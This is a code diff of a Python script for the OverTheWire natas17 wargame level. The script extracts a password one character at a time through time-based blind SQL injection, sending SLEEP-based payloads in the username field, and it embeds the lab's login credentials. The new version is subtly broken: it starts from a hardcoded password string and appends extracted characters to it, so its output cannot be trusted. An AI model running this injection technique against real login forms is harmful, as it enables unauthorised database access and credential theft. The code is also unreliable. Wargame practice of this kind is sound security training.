@@ -1,40 +1,55 @@
-import time
 import requests
 from requests.auth import HTTPBasicAuth
 import string
+import time
 
 url = "http://natas17.natas.labs.overthewire.org"
 auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
 
-# Step 1: Confirm time-based injection works
-# Test payload: natas18" AND SLEEP(5) #
-# If it delays 5 seconds, injection works
+# First, let's test if time-based injection works
+print("Testing basic time-based injection...")
+test_payload = 'natas18" AND SLEEP(5)-- -'
+start = time.time()
+r = requests.post(url, auth=auth, data={'username': test_payload}, timeout=10)
+elapsed = time.time() - start
+print(f"Test delay: {elapsed:.2f} seconds")
 
-# Step 2: Extract password length (optional)
-def find_password_length():
-    for length in range(1, 65):
-        payload = f'natas18" AND IF(LENGTH(password)={length}, SLEEP(3), 0) #'
-        start = time.time()
-        requests.post(url, auth=auth, data={'username': payload})
-        if time.time() - start > 2.5:
-            return length
+if elapsed < 4:
+    print("Time-based injection might not be working. Let's try another approach...")
 
-# Step 3: Extract password character by character
-password = ""
+# Extract password
+password = "6OG1PbKdVjyBlpxgDgDDbRk6ZLlCGgeJ"
 charset = string.ascii_letters + string.digits
 
-for position in range(1, 33):  # Adjust based on length
+print("\nExtracting password...")
+for position in range(1, 60):
+    found = False
     for char in charset:
-        # If password[position] = char, sleep for 3 seconds
-        payload = f'natas18" AND IF(SUBSTRING(password,{position},1)="{char}", SLEEP(3), 0) #'
+        # Try this injection
+        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{position},1)="{char}", SLEEP(2), 0)-- -'
         
-        start = time.time()
-        requests.post(url, auth=auth, data={'username': payload})
-        elapsed = time.time() - start
-        
-        if elapsed > 2.5:  # Noticeable delay
+        try:
+            start = time.time()
+            r = requests.post(url, auth=auth, data={'username': payload}, timeout=5)
+            elapsed = time.time() - start
+            
+            if elapsed >= 1.8:  # If it delayed ~2 seconds
+                password += char
+                print(f"Position {position}: {char} (Password: {password})")
+                found = True
+                break
+        except requests.Timeout:
+            # Timeout means it's sleeping
             password += char
-            print(f"Position {position}: {char} (Password so far: {password})")
+            print(f"Position {position}: {char} (Password: {password})")
+            found = True
             break
+        except Exception as e:
+            print(f"Error: {e}")
+            continue
+    
+    if not found:
+        print(f"Could not find character at position {position}")
+        break
 
 print(f"\nFinal password: {password}")
